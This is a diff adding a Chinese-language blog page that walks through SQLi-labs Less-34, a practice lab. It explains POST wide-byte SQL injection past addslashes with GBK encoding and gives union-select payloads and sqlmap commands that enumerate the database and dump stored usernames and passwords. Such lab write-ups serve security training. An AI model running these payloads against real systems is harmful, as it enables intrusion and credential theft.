@@ -1,0 +1,29 @@
+<hr>
+<h2 id="title-less34url-https-www-yuque-com-u29002979-ep2zrx-ql1lqmqlbybenghx"><a href="#title-less34url-https-www-yuque-com-u29002979-ep2zrx-ql1lqmqlbybenghx" class="headerlink" title="title: less34url: https://www.yuque.com/u29002979/ep2zrx/ql1lqmqlbybenghx"></a>title: less34<br>url: <a href="https://www.yuque.com/u29002979/ep2zrx/ql1lqmqlbybenghx">https://www.yuque.com/u29002979/ep2zrx/ql1lqmqlbybenghx</a></h2><pre><code class="bash">$uname = addslashes($uname1);
+$passwd= addslashes($passwd1);
+
+mysql_query(&quot;SET NAMES gbk&quot;);
+@$sql=&quot;SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39; LIMIT 0,1&quot;;
+</code></pre>
+<p>post型宽字节注入 ，单引号’闭合</p>
+<p><code>admin&#39; or 1=1-++</code></p>
+<blockquote>
+<p>Hint: The Username you input is escaped as : admin’ or 1&#x3D;1-++<br>Hint: The Password you input is escaped as :</p>
+</blockquote>
+<p>在登录框尝试字符登录发现有转义&amp;#x20;<br>&amp;#x20;因为是post提交不能使用url编码，<br>但是可以<strong>使用十六进制编码绕过</strong>，但是需要使用三个字节，<br>最好的 办法是是<strong>使用汉字</strong>(一些汉字是三个字节的就可以将后面的\消耗) <a name="rJWqQ"></a></p>
+<h1 id="post型宽字节注入"><a href="#post型宽字节注入" class="headerlink" title="post型宽字节注入"></a>post型宽字节注入</h1><p><a name="oaebC"></a></p>
+<h2 id="爆破数据库名称"><a href="#爆破数据库名称" class="headerlink" title="爆破数据库名称"></a>爆破数据库名称</h2><p><code>**uname=汉&#39;** union select 1,database()--+</code> <a name="ABEKW"></a></p>
+<h2 id="爆破数据库表名称"><a href="#爆破数据库表名称" class="headerlink" title="爆破数据库表名称"></a>爆破数据库表名称</h2><p><code>**uname=汉&#39;** union select 1,group_concat(table_name)from information_schema.tables where table_schema=database()--+</code> <a name="ihxEF"></a></p>
+<h2 id="爆破字段名称"><a href="#爆破字段名称" class="headerlink" title="爆破字段名称"></a>爆破字段名称</h2><p>爆破字段的时候<strong>需要将数据表的名字</strong>进行十六进制编码，防止转义 &amp;#x20;<br>users的16进制是0x7573657273</p>
+<p><code>**uname=汉&#39;** union select 1,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=0x7573657273--+</code> <a name="K0Bi6"></a></p>
+<h2 id="爆破字段内容"><a href="#爆破字段内容" class="headerlink" title="爆破字段内容"></a>爆破字段内容</h2><p><code>**uname=汉&#39;** union select 1,(select group_concat(username,0x7e,password) from users)--+</code></p>
+<p><a name="eRAU0"></a></p>
+<h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><blockquote>
+<p><strong>–tamper&#x3D;”unmagicquotes.py”宽字节注入</strong></p>
+</blockquote>
+<p><a name="Eou5c"></a></p>
+<h2 id="注入点检查"><a href="#注入点检查" class="headerlink" title="注入点检查"></a>注入点检查</h2><p><code>sqlmap -u http://192.168.31.193/Less-34/ --data=&quot;passwd=admin&amp;uname=admin&quot; --batch --tamper=&quot;unmagicquotes.py&quot;</code> <a name="FwuSB"></a></p>
+<h2 id="爆破数据库名称-1"><a href="#爆破数据库名称-1" class="headerlink" title="爆破数据库名称"></a>爆破数据库名称</h2><p><code>sqlmap -u http://192.168.31.193/Less-34/ --data=&quot;passwd=admin&amp;uname=admin&quot; --batch --tamper=&quot;unmagicquotes.py&quot;  --current-db</code> <a name="cWP4j"></a></p>
+<h2 id="爆破数据表名称"><a href="#爆破数据表名称" class="headerlink" title="爆破数据表名称"></a>爆破数据表名称</h2><p><code>sqlmap -u http://192.168.31.193/Less-34/ --data=&quot;passwd=admin&amp;uname=admin&quot; --batch --tamper=&quot;unmagicquotes.py&quot;  -D &quot;security&quot; --tables</code> <a name="HBofh"></a></p>
+<h2 id="爆破字段名称-1"><a href="#爆破字段名称-1" class="headerlink" title="爆破字段名称"></a>爆破字段名称</h2><p><code>sqlmap -u http://192.168.31.193/Less-34/ --data=&quot;passwd=admin&amp;uname=admin&quot; --batch --tamper=&quot;unmagicquotes.py&quot; -D &quot;security&quot; -T &quot;users&quot; --columns</code> <a name="YOLQ5"></a></p>
+<h2 id="脱库"><a href="#脱库" class="headerlink" title="脱库"></a>脱库</h2><p><code>sqlmap -u http://192.168.31.193/Less-34/ --data=&quot;passwd=admin&amp;uname=admin&quot; --batch --tamper=&quot;unmagicquotes.py&quot; -D &quot;security&quot; -T &quot;users&quot; --dump</code></p>
